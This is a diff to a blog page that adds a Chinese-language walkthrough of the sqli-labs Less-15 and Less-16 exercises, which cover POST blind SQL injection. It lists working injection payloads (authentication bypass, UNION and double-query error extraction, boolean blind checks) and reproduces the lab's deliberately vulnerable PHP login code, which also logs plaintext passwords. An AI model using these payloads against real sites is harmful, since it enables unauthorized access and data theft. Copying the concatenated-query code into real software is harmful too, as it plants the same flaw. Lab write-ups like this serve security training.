@@ -283,7 +283,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/sqli-labs-Less-11-14/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/sqli-labs-Less-11-16/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ahodor">
@@ -302,7 +302,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/04/23/sqli-labs-Less-11-14/" itemprop="url">sqli-labs-Less-11-14</a></h1>
+                <a class="post-title-link" href="/2018/04/23/sqli-labs-Less-11-16/" itemprop="url">sqli-labs-Less-11-16</a></h1>
         
 
         <div class="post-meta">
@@ -579,6 +579,84 @@ $passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;;
 <p>测试字段数    </p>
 <pre><code>uname=uname &amp;passwd=passwd&quot; or  1=1 order by 2 %23
 </code></pre><p>剩下的与Less-13相似</p>
+<h2 id="Less-15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#Less-15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="Less-15 POST-Blind-Boolian/time Based-Single quotes"></a>Less-15 POST-Blind-Boolian/time Based-Single quotes</h2><h3 id="基于布尔型或时间的单引号post盲注"><a href="#基于布尔型或时间的单引号post盲注" class="headerlink" title="基于布尔型或时间的单引号post盲注"></a>基于布尔型或时间的单引号post盲注</h3><h4 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h4><p>在后面添加<strong>单引号、双引号、括号</strong>等无任何错误显示，只显示一个错误的图片，错误回显应该是被注释了。</p>
+<pre><code>uname=uname &amp;passwd=passwd&apos; or 1=1 %23返回正确
+字段数
+uname=uname &amp;passwd=passwd&apos; or 1=1 order by 2 %23
+显示位
+uname=uname &amp;passwd=passwd&apos; or 1=1 union select 1,2 %23执行成功没有回显
+使用双查询输入
+uname=test &amp;passwd=test&apos; or 1=1  union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23 返回成功但并没有报错显示我们想要的数据
+</code></pre><h4 id="为什么Less13-14中使用双查询输入有效而在这里不行？"><a href="#为什么Less13-14中使用双查询输入有效而在这里不行？" class="headerlink" title="为什么Less13-14中使用双查询输入有效而在这里不行？"></a>为什么Less13-14中使用双查询输入有效而在这里不行？</h4><p>Less-15源代码</p>
+<pre><code>&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+error_reporting(0);
+
+// take the variables
+if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))
+{
+    $uname=$_POST[&apos;uname&apos;];
+    $passwd=$_POST[&apos;passwd&apos;];
+
+    //logging the connection parameters to a file for analysis.
+    $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
+    fwrite($fp,&apos;User Name:&apos;.$uname);
+    fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;);
+    fclose($fp);
+
+
+    // connectivity 
+    @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
+    $result=mysql_query($sql);
+    $row = mysql_fetch_array($result);
+
+    if($row)
+    {
+        //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;    
+
+        echo &quot;&lt;br&gt;&quot;;
+        echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;;
+        //echo &quot; You Have successfully logged in\n\n &quot; ;
+        echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;;    
+        echo &quot;&lt;br&gt;&quot;;
+        //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
+        echo &quot;&lt;br&gt;&quot;;
+        //echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;/font&gt;&quot;;
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;br&gt;&quot;;
+        echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&apos;;    
+
+        echo &quot;&lt;/font&gt;&quot;;
+    }
+    else  
+    {
+        echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;
+        //echo &quot;Try again looser&quot;;
+        //print_r(mysql_error());
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;    
+        echo &quot;&lt;/font&gt;&quot;;  
+    }
+}
+
+?&gt;
+</code></pre><p>查看对比两者的源代码可以发现在本关中<strong>print_r(mysql_error());</strong>函数被注释了</p>
+<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p>这里使用布尔型盲注</p>
+<pre><code>uname=test &amp;passwd=test&apos; or length((select database())) =8 %23 返回正确
+</code></pre><p>剩下参考Less-8</p>
+<h2 id="Less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><a href="#Less-16-POST-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="Less-16 POST-Blind-Boolian/Time Based-Double quotes"></a>Less-16 POST-Blind-Boolian/Time Based-Double quotes</h2><h3 id="基于布尔型或时间的双引号post盲注"><a href="#基于布尔型或时间的双引号post盲注" class="headerlink" title="基于布尔型或时间的双引号post盲注"></a>基于布尔型或时间的双引号post盲注</h3><h4 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h4><pre><code>uname=test &amp;passwd=test &apos; or 1=1 %23返回错误
+uname=test &amp;passwd=test&apos;) or 1=1 %23返回错误
+uname=test &amp;passwd=test &quot; or 1=1 %23返回错误
+uname=test &amp;passwd=test&quot;) or 1=1 %23返回正确
+</code></pre><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><pre><code>字段数
+uname=test &amp;passwd=test &quot;) or 1=1 order by 2%23返回正确
+uname=test &amp;passwd=test &quot;) or 1=1 order by 3%23返回错误
+</code></pre><p>剩下参考Less-15</p>
 
           
         
